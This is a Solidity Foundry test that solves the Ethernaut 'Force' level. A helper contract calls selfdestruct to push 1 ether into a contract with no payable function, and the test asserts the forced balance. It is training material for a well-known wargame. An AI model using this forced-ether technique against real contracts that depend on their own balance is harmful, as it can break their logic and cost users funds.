// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Force.sol";

contract MiddleMan {
    function selfDestruct(address payable target) public payable {
        selfdestruct(target);
    }
}

// use selfdestruct() to force send ether to an address
contract ForceTest is Test {
    Force force;
    MiddleMan middleMan;
    address alice = makeAddr("alice");

    function setUp() public {
        force = new Force();
        middleMan = new MiddleMan();

        vm.deal(alice, 1 ether);
    }

    function test() public {
        assertEq(address(force).balance, 0);

        vm.startPrank(alice);
        middleMan.selfDestruct{value: 1 ether}(payable(address(force)));

        assertEq(address(force).balance, 1 ether);
    }
}
